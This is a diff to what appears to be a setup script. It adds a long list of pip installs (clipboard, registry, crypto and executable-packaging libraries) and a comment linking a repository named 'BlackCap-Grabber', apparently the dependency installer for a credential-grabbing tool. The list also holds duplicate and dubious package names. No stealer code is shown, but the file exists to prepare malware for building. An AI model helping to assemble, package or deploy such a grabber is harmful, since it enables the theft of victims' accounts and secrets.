@@ -63,11 +63,30 @@ powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -A
 
 #####################################################################
 
-pip3 install threading --quiet
-pip3 install thread --quiet
-pip3 install requests --quiet 
-pip3 install Crypto --quiet 
-pip3 install pycryptodome --quiet 
+pip install httpx
+pip install pyperclip
+pip install pyotp
+pip install asyncio
+pip install winregistry
+pip install psutil
+pip install pypiwin32==223
+pip install pycryptodome
+pip install pyinstaller>=5.0
+pip install PIL-tools
+pip install asyncio
+pip install threaded
+pip install requests
+pip install datetime
+pip install colorama
+pip install pillow
+pip install customtkinter
+pip install pycryptodome
+pip install pyperclip
+pip install pyfiglet
+pip install tqdm
+
+
+//https://github.com/KSCHdsc/BlackCap-Grabber
 
 #####################################################################
 
